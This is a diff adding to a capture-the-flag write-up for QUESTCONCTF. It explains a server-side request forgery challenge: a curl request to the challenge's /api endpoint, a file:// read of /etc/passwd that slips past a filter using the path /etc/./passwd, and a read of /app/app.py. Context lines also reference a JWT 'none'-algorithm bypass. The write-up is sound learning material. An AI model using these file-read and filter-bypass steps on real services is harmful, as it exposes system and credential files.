@@ -1,4 +1,4 @@
------------------
+![image](https://github.com/user-attachments/assets/0fad64fc-90bc-4c19-8f3a-b70bc645031a)-----------------
 
 ### CTF: QUESTCONCTF
 
@@ -66,6 +66,50 @@ curl https://questcon-theadmin.chals.io/access -H "Authorization: Bearer $(echo 
 ```
 
 - Flag-:```QUESTCON{J3T_4lg0r1thm_15_vuln3r4bl3_70_n0n3}```
+
+---------------------
+
+### Challenge 3: TEMP
+
+![image](https://github.com/user-attachments/assets/748470c8-b92f-4dc0-8d28-bb37d6de8963)
+
+- I checked the source code aand noticed a `POST` request made to route `/api` which loads a url.
+
+      fetch('/api', {
+                      method: 'POST',
+                      headers: {
+                          'Content-Type': 'application/json',
+                      },
+                      body: JSON.stringify({ url: urlInput }),
+                  })
+- I made an http request to google and it worked.
+
+      ❯ curl https://questcon-temp.chals.io/api -H "Content-Type: application/json" -d '{"url": "https://www.google.com"}'
+      {"data":"<!doctype html><html itemscope=\"\" itemtype=\"http://schema.org/WebPage\" lang=\"en\"><head><meta content=\"Search the world's information, including webpages, images, videos and more. Google has many special features to help you find exactly what you're looking for.\" name=\"description\"><meta content=\"noodp, \" name=\"robots\"><meta content=\"text/html; charset=UTF-8\"
+
+- I tried to read `/etc/passwd` with `file://` schema which did not work because it was filtered.Then, I tred `/etc/./passwd` which worked.
+
+![image](https://github.com/user-attachments/assets/c76e76d3-230a-4c03-b7d0-40a5e0b293dd)
+
+- I got the flag by reading the source code stored in `/app/app.py`.I got this idea because most ctf challenges are stored in `/app/app.py`.
+
+![image](https://github.com/user-attachments/assets/a9abae67-3da3-4799-bd5d-7c495faa1b3c)
+
+- Flag-: ```'QUESTCON{r3c0ver_d3l3t3d_fil3}```
+
+-------------------
+
+### THANKS FOR READING
+
+-------------------
+
+### REFERENCES:
+
+- [Direction's script](https://github.com/SENSEiXENUS/senseixenus.github.io/blob/main/posts/ctf/QUESTcon24/scripts/direction.py)
+
+
+
+
 
 
 
